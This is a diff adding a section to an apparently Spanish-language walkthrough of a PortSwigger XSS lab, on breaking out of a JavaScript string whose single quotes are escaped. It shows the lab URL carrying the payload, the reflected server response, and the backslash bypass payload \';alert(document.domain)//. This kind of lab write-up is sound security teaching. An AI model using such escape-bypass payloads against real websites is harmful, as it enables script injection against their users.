@@ -449,6 +449,37 @@ Entonces diseñamos el siguiente payload.
 
 ## 15. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 
+```
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+```
+
+URL
+
+```
+https://acc31f9a1fc4e81080ad779600f40026.web-security-academy.net/?search=';alert(document.domain)//	
+```
+
+Respuesta
+
+```
+<script>
+    var searchTerms = '\';alert(document.domain)//';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+Entonces, como podemos ver le agrega un **\\** en la comilla simple entonces lo que haremos será agregar de por si un **\\** para que no nos bloquee la comilla simple, con el siguiente payload
+
+```
+\';alert(document.domain)//
+```
+
+![](img41.png)
+
+## 16. Lab: Reflected XSS in a JavaScript URL with some characters blocked
+
 
 
 
